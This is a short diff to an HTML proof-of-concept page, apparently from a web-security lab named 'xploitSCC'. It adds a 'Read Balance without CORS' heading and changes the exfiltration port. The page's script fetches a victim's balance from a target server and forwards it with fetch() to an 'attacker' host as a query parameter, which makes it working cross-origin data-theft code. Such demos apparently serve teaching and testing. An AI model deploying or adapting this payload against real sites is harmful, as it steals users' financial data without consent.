@@ -1,6 +1,6 @@
 <html>
 <body>
-
+<h2> Read Balance without CORS </h2>
 <script>
   fetch("http://target:8000/xploitSCC/my_balance_no_cors", {
         method: "GET",
@@ -8,7 +8,7 @@
     })
     .then(response => response.text())
     .then((response) => {
-        fetch("http://attacker:8081/?balance="+response);
+        fetch("http://attacker:8001/?balance="+response);
     });
 </script>
 
